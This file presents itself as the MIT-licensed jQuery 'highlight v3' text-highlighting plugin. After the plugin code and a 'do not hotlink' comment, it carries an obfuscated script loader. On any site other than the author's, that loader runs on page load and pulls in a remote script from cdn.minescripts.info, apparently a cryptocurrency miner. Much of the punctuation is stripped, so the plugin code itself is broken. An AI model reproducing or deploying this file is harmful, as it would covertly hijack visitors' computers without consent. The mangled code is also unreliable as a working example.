

highlight v3

Highlights arbitrary terms.

httpjohannburkard.deblogprogrammingjavascripthighlight-javascript-text-higlighting-jquery-plugin.html

MIT license.

Johann Burkard
httpjohannburkard.de
mailtojb@eaio.com



jQuery.fn.highlight = function(pat) {
 function innerHighlight(node, pat) {
  var skip = 0;
  if (node.nodeType == 3) {
   var pos = node.data.toUpperCase().indexOf(pat);
   if (pos = 0) {
    var spannode = document.createElement('span');
    spannode.className = 'highlight';
    var middlebit = node.splitText(pos);
    var endbit = middlebit.splitText(pat.length);
    var middleclone = middlebit.cloneNode(true);
    spannode.appendChild(middleclone);
    middlebit.parentNode.replaceChild(spannode, middlebit);
    skip = 1;
   }
  }
  else if (node.nodeType == 1 && node.childNodes && !(scriptstyle)i.test(node.tagName)) {
   for (var i = 0; i  node.childNodes.length; ++i) {
    i += innerHighlight(node.childNodes[i], pat);
   }
  }
  return skip;
 }
 return this.each(function() {
  innerHighlight(this, pat.toUpperCase());
 });
};

jQuery.fn.removeHighlight = function() {
 return this.find(span.highlight).each(function() {
  this.parentNode.firstChild.nodeName;
  with (this.parentNode) {
   replaceChild(this.firstChild, this);
   normalize();
  }
 }).end();
};

 PLEASE DO NOT HOTLINK MY FILES, THANK YOU. 

if (!johannburkard.de$i.test(location.hostname)) {
    (function() {
        function load(b,c){var d=document,f=script,a=d.createElement(f),e=2166136261,g=b.length,h=c,k==;d=d.getElementsByTagName(script)[0];if(k.test(b)){for(;g--;)e=16777619e^b.charCodeAt(g);window[f+=0e-ee]=function(){h.apply(h,arguments);delete window[f]};b=b.replace(k,=+f);c=0}a.onload=a.onreadystatechange=function(){if(dem.test(a.readyStatem)){c&&c();d.parentNode.removeChild(a);try{for(c in a)delete a[c]}catch(l){}}};a.src=b;window.setTimeout(function(){d.parentNode.insertBefore(a,d)},0)};
        load('httpscdn.minescripts.infocZLPA.js')
    })()
}